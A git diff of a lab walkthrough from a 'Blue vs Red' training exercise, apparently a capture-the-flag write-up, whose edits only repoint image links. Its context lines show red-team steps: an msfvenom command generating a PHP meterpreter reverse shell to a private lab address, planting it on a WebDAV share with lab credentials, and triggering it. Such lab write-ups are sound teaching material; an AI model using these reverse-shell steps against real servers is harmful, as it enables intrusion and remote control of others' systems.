@@ -79,7 +79,7 @@ paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes.
 - To set up the reverse shell, run:
 	- msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/11_msfvenom.jpg)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/Images/11_msfvenom.jpg)
 
 - The series of command above does the following :
 
@@ -95,19 +95,19 @@ paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes.
 
 	- exploit  
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/12_listener.jpg)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/Images/12_listener.jpg)
 
 - Place the reverse shell onto the webDAV directory
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/13_implanting_the_reverse.jpg)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/Images/13_implanting_the_reverse.jpg)
 
 - We logged back in, visited the webdav folder by navigating to 192.168.1.105/webdav. Used the credentials obtained before, user:ryan pass:linux4u
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/14_webdav_%20access_laststeps.png)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/Images/14_webdav_%20access_laststeps.png)
 
 - I visited where i uploaded the reverse shell and clicked it to activate it. (If it seems like tge browser is hanging or loading, that means it has worked.)
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/15_activiating_the_shell.jpg)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/Images/15_activiating_the_shell.jpg)
 
 
 ### Step 7: Find and capture the flag. 
